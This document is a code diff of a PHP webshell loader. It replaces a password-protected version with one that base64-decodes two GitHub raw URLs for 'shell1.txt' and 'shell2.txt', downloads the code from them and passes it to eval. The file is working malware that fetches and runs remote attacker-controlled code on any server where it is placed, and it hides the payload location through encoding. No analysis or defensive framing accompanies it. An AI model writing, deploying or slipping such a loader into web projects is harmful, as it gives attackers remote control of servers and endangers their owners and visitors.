@@ -1,59 +1,40 @@
 <?php
-session_start();
+function get($url) {
+    $ch = curl_init();
 
-if(isset($_POST['pass']) && $_POST['pass'] === 'sibueee') {
-    $_SESSION['authenticated'] = true;
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    curl_setopt($ch, CURLOPT_NOBODY, true);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); 
+
+    if ($http_code == 200) {
+        curl_setopt($ch, CURLOPT_NOBODY, false);
+        curl_setopt($ch, CURLOPT_HEADER, false);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    } else {
+        curl_close($ch);
+        return false;
+    }
 }
 
-if(!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
-    echo "
-    <!DOCTYPE html>
-    <html lang=\"en\">
+$x = '?>';
+$url1 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpYnVlZWUvd2Vic2hlbGwvbWFpbi9zaGVsbDEudHh0');
+$url2 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpYnVlZWUvd2Vic2hlbGwvbWFpbi9zaGVsbDIudHh0');
 
-    <head>
-        <meta charset=\"UTF-8\">
-        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">
-        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
-        <style>
-            body {
-                font-family: monospace;
-            }
-
-            input[type=\"password\"] {
-                border: none;
-                border-bottom: 1px solid black;
-                padding: 2px;
-            }
-
-            input[type=\"password\"]:focus {
-                outline: none;
-            }
-
-            input[type=\"submit\"] {
-                border: none;
-                padding: 4.5px 20px;
-                background-color: #2e313d;
-                color: #FFF;
-            }
-        </style>
-    </head>
-
-    <body>
-        <form action=\"\" method=\"post\">
-            <div align=\"center\">
-                <input type=\"password\" name=\"pass\" placeholder=\"&nbsp;Password\">&nbsp;<input type=\"submit\" name=\"submit\" value=\">\">
-            </div>
-        </form>
-    </body>
-
-    </html>";
-    exit;
+$script1 = get($url1);
+if ($script1 !== false && $script1 !== 404) {
+    eval($x . $script1);
+} else {
+    $script2 = get($url2);
+    if ($script2 !== false) {
+        eval($x . $script2);
+    } else {
+        echo "Both attempts failed.";
+    }
 }
-
-$url = 'https://github.com/sibueee/webshell/blob/main/imu.php';
-$kode = file_get_contents($url);
-if ($kode === FALSE) {
-    die('Error fetching code from URL.');
-}
-eval('?>' . $kode);
 ?>
